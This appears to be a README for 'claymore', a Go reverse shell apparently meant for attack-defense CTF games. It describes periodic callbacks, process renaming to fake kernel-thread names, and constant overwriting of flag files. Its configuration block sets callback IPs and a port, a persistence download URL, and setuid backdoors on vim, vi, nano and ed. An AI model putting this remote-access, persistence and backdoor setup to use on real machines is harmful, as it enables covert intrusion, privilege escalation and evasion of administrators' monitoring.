# claymore
Smart reverse shell.

- Reconnects back periodically.
- Renames itself to something unsuspicious.
- Overwrites the flag file constantly.

## Usage
Remember to change the options in the script. YOU MUST DO THIS
```
	//Define the list of IP addresses to connect to.
	ips := []string{"127.0.0.1", "localhost"} // Example list of IP addresses
	//Define the port to connect to.
	port := "1984"
	//Define the paths to all the ctf flag files to overwrite with our own.
	flagFiles := []string{"/home/justin/flag.txt"} // Example list of flag file paths
	//define the string to overwrite the flag files with.
	flag := "flag{this_is_a_fake_flag}"
	//define the list of binaries to add the suid bit to. (ROOT ONLY)
	setuidBackdoorBinaries := []string{"/usr/bin/vim", "/usr/bin/vi", "/usr/bin/nano", "/bin/ed"}
	//rename the process to something less suspicious.
	list_of_unsuspicious_filenames := []string{
		"[kworker/0:1]",
		"(sd-pam)",
		"[irq/16-vmwgfx]",
		"[scsi_eh_29]",
		"[acpi_thermal_pm]",
		"[kworker/0:0-events]",
		"[migration/0]",
		"[ksoftirqd/0]",
	}
	//Define the address to download this binary from for the persistence.
	downloadURL := "http://127.0.0.1:5000/hello"
```